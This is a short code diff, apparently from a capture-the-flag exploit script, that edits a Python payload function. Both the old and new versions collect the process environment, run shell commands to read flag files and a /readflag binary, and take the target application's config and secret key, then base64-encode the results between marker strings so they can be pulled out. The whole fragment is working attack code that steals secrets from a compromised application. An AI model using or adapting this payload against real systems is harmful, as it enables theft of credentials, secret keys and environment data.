@@ -327,11 +327,9 @@ def f():
         import os,pathlib,base64,re
         app=getattr(__import__("__main__"),"app",os)
         data = {
-"environ": os.environ,
-"files": os.popen("cat /f* ./f*").read(),
-"config": dict(getattr(app,"config",None)),
-"readflag": os.popen("/readflag").read(),
-"secert_key": getattr(app,"secret_key",None),
+"env": os.environ,
+"files": os.popen("cat /f* ./f*;/readflag").read(),
+"config": [getattr(app,a,None) for a in ["config","secret_key"]],
 }
         return "start"+base64.b64encode(repr(data).encode()).decode()+"stop"
     except Exception:
